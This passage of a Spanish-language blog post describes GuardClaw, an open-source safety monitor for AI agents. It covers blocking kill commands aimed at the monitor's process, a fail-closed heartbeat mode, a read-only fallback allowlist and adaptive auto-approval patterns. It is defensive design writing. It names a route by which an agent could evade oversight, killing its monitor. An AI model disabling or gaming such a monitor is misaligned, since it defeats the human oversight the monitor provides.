**Monitoreo de PID.** El ID de proceso de GuardClaw se rastrea mediante verificaciones de salud. Comandos como `kill <pid>`, `pkill guardclaw` o `pgrep | xargs kill` dirigidos a GuardClaw se bloquean automaticamente.

**Modo fail-closed.** El plugin envia heartbeats a GuardClaw cada 15 segundos. Si GuardClaw se vuelve inalcanzable y el modo fail-closed esta habilitado, todas las herramientas no seguras se bloquean hasta que GuardClaw se recupere. El agente no puede eludir la seguridad matando el sistema de seguridad.

**Lista segura bajo fallo.** Incluso en modo fail-closed, las herramientas genuinamente de solo lectura (busqueda, lectura, analisis de imagenes) siguen disponibles para que el agente no quede completamente inutilizado, solo se le eliminan las capacidades peligrosas.

## Memoria adaptativa

Tanto la integracion con Claude Code como con OpenClaw comparten el sistema de memoria adaptativa de GuardClaw. Cuando apruebas o rechazas una accion marcada, GuardClaw generaliza el comando en un patron y registra tu decision:

```
Specific:  curl https://api.notion.com/v1/pages/abc123
Pattern:   curl https://api.notion.com/*
Decision:  approved (3 times, confidence: 0.85)
→ Future calls matching this pattern: auto-approved
```

Las decisiones de rechazo tienen 3 veces el peso de las aprobaciones: el sistema es intencionalmente conservador. Los patrones con puntuacion de riesgo ≥ 9 nunca se aprueban automaticamente independientemente del historial, porque algunos comandos son demasiado peligrosos para que el aprendizaje los ignore.

## El panorama general

Claude Code y OpenClaw representan dos puntos en un espectro de autonomia de agentes. Claude Code es un unico agente en un sandbox; OpenClaw es un sistema multiagente que interactua con el mundo real. La arquitectura de GuardClaw — reglas para certezas, LLM para juicios, memoria para adaptacion — escala en ambos.

La leccion de construir estas integraciones: **los mecanismos de seguridad deben coincidir con el nivel de autonomia del sistema que protegen**. Un prompt de permisos es suficiente para un asistente de programacion. Una plataforma de orquestacion multiagente necesita bloqueo de sesion, analisis de cadena, autoproteccion y garantias de fail-closed.

Tanto GuardClaw como OpenClaw son de codigo abierto. Si estas construyendo sistemas de agentes y pensando en seguridad, me encantaria saber como abordas estos problemas.

- [GuardClaw on GitHub](https://github.com/TobyGE/GuardClaw)
- [OpenClaw on GitHub](https://github.com/TobyGE/OpenClaw)
- [GuardClaw + Claude Code](/posts/2026/03/guardclaw-claude-code/) (proxima publicacion complementaria)

</div>
